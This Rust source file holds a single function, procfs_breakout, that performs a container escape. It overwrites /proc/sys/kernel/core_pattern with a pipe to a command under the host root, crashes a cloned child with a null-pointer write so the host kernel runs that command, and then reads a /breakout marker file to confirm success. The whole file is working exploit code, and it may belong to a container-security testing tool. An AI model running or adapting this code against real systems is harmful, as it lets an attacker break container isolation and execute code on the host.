use std::io::{Read, Write};

use nix::{
    libc::SIGCHLD,
    sched::{self, CloneFlags},
    sys::wait::waitpid,
};

///
/// 1. write "|$host_root/cmd" >> /proc/sys/kernel/core_pattern
/// 2. create process and segv
///
pub fn procfs_breakout(host_root: &str) -> Result<bool, Box<dyn std::error::Error>> {
    let mut core_pattern = std::fs::File::options()
        .write(true)
        .open("/proc/sys/kernel/core_pattern")?;

    core_pattern.write_all(format!("|{}/cmd", host_root).as_bytes())?;

    let mut stack = [0u8; 1024];
    let pid = unsafe {
        sched::clone(
            Box::new(|| {
                std::ptr::null_mut::<i32>().write(42);
                127
            }),
            &mut stack,
            CloneFlags::empty(),
            Some(SIGCHLD),
        )?
    };

    let _ = waitpid(pid, None);

    let mut breakout = std::fs::File::open("/breakout")?;
    let mut buf = String::default();
    breakout.read_to_string(&mut buf)?;

    Ok(buf.contains("true"))
}
